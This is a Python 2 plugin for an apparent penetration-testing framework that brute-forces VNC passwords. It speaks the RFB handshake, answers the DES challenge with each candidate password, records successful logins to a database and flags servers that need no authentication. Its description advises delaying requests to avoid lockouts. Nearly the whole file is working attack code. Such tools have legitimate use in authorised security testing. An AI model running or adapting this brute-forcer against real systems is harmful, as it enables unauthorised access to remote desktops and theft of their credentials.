#!/usr/bin/env python2

# tested with RFB 003.008

# http://www.realvnc.com/docs/rfbproto.pdf

from recotak import *
import socket
import struct
from ctools import cTuples
from Crypto.Cipher import DES

# return status
# status 0 = success ("none" authentication method)
# status 1 = success (good password)
# status 2 = bad password
# status 3 = bad configuration (wrong version, wrong security type)
# status 4 = bad connection
# status 5 = too many failures

def testvnc(target, port, password):
    ip = target[0]

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(testvnc.timeout)
        s.connect((ip, port))
    except socket.error as e:
        rLog.log.error("Cannot connect to %s:%d", ip, port)
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration
    except Exception as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration
    rLog.log.info("Connected to %s:%d", ip, port)

    # 11111
    # first, the server sends its RFB version, 12 bytes
    # more than 12 bytes if too many failures
    try:
        data = s.recv(1024)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration
        if testvnc.verbose:
            rLog.log.info("%s: Received [%d] version:\n%r", ip, len(data), data)
    if len(data) > 12:
        yield(4, target, port, password)
        raise StopIteration
    if data == "RFB 003.003\n":
        version = 3
    elif data == "RFB 003.007\n":
        version = 7
    elif data == "RFB 003.008\n":
        version = 8
    else:
        yield(3, target, port, password)
        raise StopIteration
    rLog.log.info("%s: RFB Version: 3.%d", ip, version)

    # 22222
    # now, the client sends its RFB version, 12 bytes
    m = data
    if testvnc.verbose:
        rLog.log.debug("%s: Sending [%d] version:\n%r", ip, len(m), m)
    try:
        s.send(m)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration

    # 33333
    # now, the server sends the security type[s]
    # in version 3, the server decides the security type, 4 bytes
    # in version 3 using RealVNC, the server sends authentication type and challenge in one message, thus recv(4)
    # in version 7/8, the server sends a list of supported security types: number of security types of 1 byte followed by a list of security types of 1 byte each
    try:
        if version == 3:
            data = s.recv(4)
        else:
            data = s.recv(1024)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration
        if testvnc.verbose:
            rLog.log.debug("%s: Received [%d] security type[s]:\n%r", ip, len(data), data)

    if version == 3:
        security_type = struct.unpack("!I", data)[0]
        # security type 0 == Invalid
        # security type 1 == None
        # security type 2 == VNC
        if security_type == 1:
            rLog.log.exception(e)
            yield(0, target, port, password)
            raise StopIteration
        elif security_type != 2:
            yield(3, target, port, password)
            raise StopIteration
    else:
        number_of_security_types = struct.unpack("!B", data[0])[0]
        if testvnc.verbose:
            rLog.log.debug("%s: Number of security types: %d", ip, number_of_security_types)
        if number_of_security_types == 0:
            # no security types supported
            yield(3, target, port, password)
            raise StopIteration
        vnc_enabled = False
        for i in range(1, number_of_security_types + 1):
            if i >= len(data):
                # should not happen, but don't want to cause an exception
                break
            security_type = struct.unpack("!B", data[i])[0]
            # security type 1 = None
            # security type 2 = VNC
            # security type 16 = Tight
            # security type 18 = VNC
            # security type 19 = VeNCrypt
            # plus some more
            if security_type == 1:
                yield(0, target, port, password)
                raise StopIteration
            elif security_type == 2:
                vnc_enabled = True
        if not vnc_enabled:
            rLog.log.info("VNC security type not supported")
            yield(3, target, port, password)
            raise StopIteration

        # 44444
        # now, the client selects the VNC (2) security type, 1 byte
        m = struct.pack("!B", 2)
        if testvnc.verbose:
            rLog.log.debug("%s: Sending [%d] security type:\n%r", ip, len(m), m)
        try:
            s.send(m)
        except socket.error as e:
            rLog.log.exception(e)
            yield(4, target, port, password)
            raise StopIteration

    # 55555
    # now, the server sends the authentication challenge, 16 bytes
    try:
        data = s.recv(16)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration

    challenge = struct.unpack("!16s", data)[0]
    if testvnc.verbose:
        rLog.log.debug("%s: Received [%d] challenge:\n%r", ip, len(challenge), challenge)

    # 66666
    # now, the client sends the response, 16 bytes
    key = calc_key(password)
    # encrypt 'challenge' using DES with 'key'
    cipher = DES.new(key, DES.MODE_ECB)
    response = cipher.encrypt(challenge)
    if testvnc.verbose:
        rLog.log.debug("%s: Sending [%d] response:\n%r", ip, len(response), response)
    try:
        s.send(response)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration

    # 77777
    # last, the server sends an ok or fail
    # 0 == OK, 1 == failed
    try:
        data = s.recv(1024)
    except socket.error as e:
        rLog.log.exception(e)
        yield(4, target, port, password)
        raise StopIteration
        if testvnc.verbose:
            rLog.log.debug("%s: Received [%d] security result:\n%r", ip, len(data), data)

    result = struct.unpack("!I", data[0:4])[0]
    rLog.log.debug('Got response: %s', result)
    if result == 0:
        # good password
        yield(1, target, port, password)
        raise StopIteration
    elif result == 1:
        # bad password
        yield(2, target, port, password)
        raise StopIteration
    else:
        # protocol error
        yield(3, target, port, password)
        raise StopIteration


def calc_key(password):
    key = password

    # first, pad the key with zeros to 8 bytes
    while len(key) < 8:
        key = key + "\x00"
    if len(key) > 8:
        key = key[:8]

    # second, flip all bytes individually
    flipped_key = ""
    for i in range(0, 8):
        b = struct.unpack("B", key[i])[0]
        b_new = 0b00000000

        b_mask = 0b10000000
        bit = b & b_mask
        bit = bit >> 7
        b_new = b_new | bit

        b_mask = 0b01000000
        bit = b & b_mask
        bit = bit >> 5
        b_new = b_new | bit

        b_mask = 0b00100000
        bit = b & b_mask
        bit = bit >> 3
        b_new = b_new | bit

        b_mask = 0b00010000
        bit = b & b_mask
        bit = bit >> 1
        b_new = b_new | bit

        b_mask = 0b00001000
        bit = b & b_mask
        bit = bit << 1
        b_new = b_new | bit

        b_mask = 0b00000100
        bit = b & b_mask
        bit = bit << 3
        b_new = b_new | bit

        b_mask = 0b00000010
        bit = b & b_mask
        bit = bit << 5
        b_new = b_new | bit

        b_mask = 0b00000001
        bit = b & b_mask
        bit = bit << 7
        b_new = b_new | bit

        #print bin(b)
        #print bin(b_new)

        flipped_key = flipped_key + struct.pack("B", b_new)

    return flipped_key


def main(dbh, target=None, port=None, password=None, timeout=None, verbose=None, **kwargs):

    if verbose:
        rLog.set_verbosity_console('vvvv')

    testvnc.verbose = verbose
    testvnc.timeout = timeout
    tuples = cTuples.cTuples(inputs=[target, port, password],
                             prep_callback=testvnc,
                             )
    tuples.setDaemon(True)
    tuples.start()

    row_fmt = "{:24} {:50} {:50}"
    print '-' * 126
    print row_fmt.format('target', 'password', 'status')
    print '-' * 126
    for status, target, port, password in tuples.tuple_q:
        ip = target[0]
        fqdn = ''.join(target[1])
        if status == 0:
            msg = "\"None\" authentication method detected"
        elif status == 1:
            msg = "Authentication successful"

            br = BruteforceResult2(
                password=password,
                ip=ip,
                fqdn=fqdn,
                port=port,
                service='vnc',
            )
            dbh.add(br)
        elif status == 2:
            msg = "Authentication failed"
        elif status == 3:
            msg = "Protocol error"
        elif status == 4:
            msg = "Network error"
        elif status == 5:
            msg = "Too many failures"

        print row_fmt.format('%s:%d' % (ip, port), password, msg)

    tuples.join()


desc = {

    "execfunc": main,

    'defaults': {
        'Port': '5900',
        'Target': '127.0.0.1',
    },

    "plgclass": ["bruteforce"],

    #plgin name
    "plgname": "vnc_bruteforce",

    #plgin author
    "plgauthor": "dash",

    # description
    "desc": ("vnc password bruteforcer, some vnc servers "
             "block further login attemtps after serveral requests. "
             "Please use the delay option (-d, --delay) to space the requests far"
             "enough apart."),

    #root?
    "gainroot": False,

    #interaktiv
    "interactive": False,

    #direct connection
    "direct": False,

    #rank
    "rank": "EXPERIMENTAL"
}

def register():
    plugin = Plugin2(**desc)
    return plugin
